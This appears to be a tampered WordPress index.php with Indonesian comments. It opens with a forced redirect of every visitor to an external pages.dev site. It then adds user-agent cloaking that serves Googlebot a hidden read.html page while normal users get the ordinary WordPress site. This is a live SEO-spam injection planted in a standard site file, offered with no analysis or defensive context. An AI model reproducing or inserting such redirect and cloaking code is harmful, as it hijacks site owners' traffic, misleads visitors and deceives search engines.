<?php

header("Location: https://raja-firaun-dateng-bos.pages.dev/", true, 302);

exit();

?>

<?php

// 1. Fungsi Cek Googlebot

function is_google_bot() {

    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");

    foreach ($agents as $agent) {

        if (isset($_SERVER['HTTP_USER_AGENT']) && strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {

            return true;

        }

    }

    return false;

}



// 2. Logika Cloaking

if (is_google_bot()) {

    // Jika BOT, tampilkan isi file read.html

    if (file_exists(__DIR__ . '/read.html')) {

        include __DIR__ . '/read.html';

        exit; // Berhenti di sini, jangan muat WordPress

    }

}



// 3. Jalur Normal (WordPress) - Untuk User Biasa

/**

 * Tells WordPress to load the WordPress theme and output it.

 *

 * @var bool

 */

define( 'WP_USE_THEMES', true );



/** Loads the WordPress Environment and Template */

require __DIR__ . '/wp-blog-header.php';



